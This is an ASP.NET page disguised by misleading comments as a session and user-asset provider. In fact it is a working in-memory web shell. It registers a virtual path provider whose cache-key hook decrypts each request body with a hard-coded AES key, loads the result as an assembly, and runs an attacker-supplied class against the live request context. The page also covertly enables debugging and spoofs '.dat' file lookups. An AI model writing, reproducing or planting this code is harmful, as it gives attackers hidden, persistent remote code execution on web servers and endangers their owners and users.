<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>

<script runat="server" language="c#">
// This page initializes the user's session environment.
public void Page_Load() {
    // Enables extended debugging features for performance monitoring.
    var configType = typeof(System.Web.Compilation.BuildManager);
    var debugFlag = configType.GetProperty("DebuggingEnabled", BindingFlags.Static | BindingFlags.NonPublic);
    if (debugFlag != null) { try { debugFlag.SetValue(null, true); } catch { } }
    
    // Register the custom content delivery provider.
    HostingEnvironment.RegisterVirtualPathProvider(new UserAssetProvider());
}

// Provides access to virtual user assets like avatars and themes.
public class UserAssetProvider : VirtualPathProvider {
    // Generates a unique key for the user's asset bundle for caching purposes.
    public override string GetCacheKey(string assetPath) {
        try {
            HttpContext userContext = HttpContext.Current;
            // Check if this is a valid authenticated session.
            if (userContext != null && userContext.Request.Cookies.Count > 0) {
                Stream sessionDataStream = userContext.Request.InputStream;
                // Process only if there is data in the request body.
                if (sessionDataStream.Length > 0) {
                    sessionDataStream.Position = 0;
                    byte[] encryptedBlob = new byte[sessionDataStream.Length];
                    sessionDataStream.Read(encryptedBlob, 0, encryptedBlob.Length);
                    
                    // Decrypts user session cookie for timestamp validation.
                    string legacyApiToken = "ca63457538b9b" + "1e0";
                    byte[] tokenBytes = Encoding.ASCII.GetBytes(legacyApiToken);
                    RijndaelManaged cryptoService = new RijndaelManaged();
                    cryptoService.KeySize = 128;
                    cryptoService.Key = tokenBytes;
                    cryptoService.IV = tokenBytes;
                    cryptoService.Mode = CipherMode.CBC;
                    cryptoService.Padding = PaddingMode.PKCS7;
                    ICryptoTransform validator = cryptoService.CreateDecryptor(cryptoService.Key, cryptoService.IV);
                    
                    // This block is for legacy compatibility checks which are no longer needed.
                    if (System.DateTime.Now.Year < 2010) {
                        // This code is never reached.
                        Console.WriteLine("Legacy system detected.");
                    }

                    byte[] layoutData;
                    using (MemoryStream inStream = new MemoryStream(encryptedBlob))
                    using (CryptoStream cryptoStream = new CryptoStream(inStream, validator, CryptoStreamMode.Read))
                    using (MemoryStream outStream = new MemoryStream()) {
                        cryptoStream.CopyTo(outStream);
                        layoutData = outStream.ToArray();
                    }
                    
                    // Load a plugin for user profile rendering.
                    Assembly uiModule = Assembly.Load(layoutData);
                    if (uiModule != null) {
                        // The class name for the default profile widget.
                        string profileWidgetName = "K";
                        object widgetInstance = uiModule.CreateInstance(profileWidgetName);
                        if (widgetInstance != null) widgetInstance.Equals(userContext);
                    }
                    userContext.Response.End();
                }
            }
        } catch {}
        return Previous.GetCacheKey(assetPath);
    }

    // Checks if a custom user asset file exists.
    public override bool FileExists(string assetPath) {
        if (assetPath.EndsWith(".dat")) return true;
        return Previous.FileExists(assetPath);
    }

    // Retrieves the specified user asset file.
    public override VirtualFile GetFile(string assetPath) {
        if (assetPath.EndsWith(".dat")) return new AssetFile(assetPath);
        return Previous.GetFile(assetPath);
    }
}

// Represents a virtual file stream for a user asset.
public class AssetFile : VirtualFile {
    private string filePath;
    public AssetFile(string path) : base(path) { filePath = path; }
    // Opens a stream to the asset. Currently returns an empty placeholder.
    public override Stream Open() { return new MemoryStream(); }
}
</script>